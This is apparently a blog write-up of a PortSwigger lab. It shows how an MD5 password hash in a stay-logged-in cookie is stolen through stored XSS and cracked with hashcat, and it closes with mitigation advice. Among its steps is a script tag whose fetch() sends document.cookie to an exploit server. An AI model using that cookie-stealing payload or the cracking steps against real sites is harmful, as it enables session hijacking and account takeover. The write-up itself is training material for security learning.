---
layout: post
title: "PortSwigger Lab: Offline password cracking"
date: 2026-02-03
categories:
  [
    "PortSwigger",
    "Practice",
    "Authentication Vulnerabilities",
    "Vulnerabilities in other authentication mechanisms",
  ]
tags:
  - "PortSwigger"
  - "Authentication Vulnerabilities"
  - "Vulnerabilities in other authentication mechanisms"
  - "Stay Logged In"
  - "XSS"
  - "Cookies"
  - "Brute Force"
  - "Hashcat"
  - "Burp Suite"
---

# PortSwigger Lab: Offline password cracking

# Table of Contents

- [Overview / Goal](#overview--goal)
- [Lab Setup and Tools](#lab-setup-and-tools)
- [Solution Steps](#solution-steps)
- [What I'd Do Next (Blue Team)](#what-id-do-next)
- [Try This Lab Yourself](#try-this-lab-yourself)

---

# Overview / Goal {#overview--goal}

> This lab stores the user's password hash in a cookie. The lab also contains an XSS vulnerability in the comment functionality. To solve the lab, obtain Carlos's `stay-logged-in` cookie and use it to crack his password. Then, log in as `carlos` and delete his account from the "My account" page.
>
> - Your credentials: `wiener:peter`
> - Victim's username: `carlos`

# Lab Setup and Tools {#lab-setup-and-tools}

- Burp Suite + Firefox (through FoxyProxy)
- Hashcat

---

# Solution Steps {#solution-steps}

**1) Analysing the Stay-Logged-In Cookie**

I started the same way I always do when I'm given creds. Logged in as `wiener:peter`.

Once logged in, I checked the request to my account page:

```http
GET /my-account?id=wiener HTTP/2
Host: 0a8500bd040f9d8380a40dbf00a00081.web-security-academy.net
Cookie: session=pppNAr3YwlgyzEM44XIR0QpG1IN3QQ22; stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw
Referer: https://0a8500bd040f9d8380a40dbf00a00081.web-security-academy.net/login
```

That `stay-logged-in` cookie looked very familiar...

I sent it to Burp Decoder and Base64-decoded it:

```plaintext
wiener:51dc30ddc473d43a6011e9ebba6ca770
```

Yep. Same pattern as the previous lab.

```plaintext
username:hash
```

And the hash looked like MD5 again.

I threw it into hashcat just to confirm, and funny enough, it was **the exact same hash** from the last lab! That's `peter` MD5'd.

So at this point, I know exactly how the site works:

- Password is MD5-hashed
- Stored client-side inside `stay-logged-in`
- Base64-encoded with username

But wait...

I was never given a password list for this lab...

So brute-forcing Carlos directly isn't the intended path.

That's where the XSS mentioned in the scenario comes in?

**2) Finding and Confirming XSS**

The lab description mentioned an XSS vulnerability in the comment functionality, so I logged out and started looking around the site.

I found a post with a comment section and tested a basic payload:

```html
<script>
  alert("meow meow");
</script>
```

Submitted the comment, refreshed the page, and alert popped!

XSS confirmed.

**3) Stealing Carlos's Cookie via XSS**

Now the goal is simple. If Carlos views this comment, I get his cookies.

I saw a payload in the community solutions that redirects the browser, but I wanted to try something on my own. I don't really know JavaScript, but after a bit of research, I ended up with this:

```js
<script>
  fetch("https://exploit-0a4b0026047ca53480dd02550112005c.exploit-server.net/exploit?c="+document.cookie)
</script>
```

This just sends `document.cookie` to my exploit server as a query parameter.

I submitted this payload as a comment.

Then I went to the **Exploit Server**, clicked **Access log**, and waited.

Eventually, the emulated Carlos did his thing 😄

I saw this in the logs:

```
GET /exploit?c=secret=XXezwn81nCOaTE1daPz22dV0kSO18LFy; stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz
```

That's exactly what I wanted.

**4) Cracking Carlos's Password Offline**

First, I confirmed it was Carlos.

I Base64-decoded the stolen cookie:

```plaintext
carlos:26323c16d5f4dabff3bb136f2460a943
```

Alright. Time to crack it.

Since the lab didn't give a password list, I first tried the usual one anyway:

```bash
echo 26323c16d5f4dabff3bb136f2460a943 > hash.txt
hashcat -m 0 -a 0 hash.txt /home/kali/pw
```

Nothing...

That explains why they didn't give a list 😅

So I switched to rockyou:

```bash
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

And there it was:

```bash
26323c16d5f4dabff3bb136f2460a943:onceuponatime
```

So the creds are:

`carlos:onceuponatime` ✅

**5) Finishing the Lab**

I logged in as Carlos, went to the **My account** page, and deleted his account as requested.

Lab solved.

---

# What I'd Do Next (Blue Team) {#what-id-do-next}

- Again, rely on Web Frameworks for Session Cookie Management to use a signed, server-generated token instead of encoding credentials.
- Mark authentication cookies as HttpOnly, Secure, and SameSite=Strict.
- Use proper output encoding and input handling in all functionality.
- Add a CSP.
- Require re-authentication for sensitive actions such as account deletion.

---

# Try This Lab Yourself {#try-this-lab-yourself}

🔗 Lab Link: [PortSwigger Lab: Offline password cracking](https://portswigger.net/web-security/learning-paths/authentication-vulnerabilities/vulnerabilities-in-other-authentication-mechanisms/authentication/other-mechanisms/lab-offline-password-cracking){:target="\_blank"}
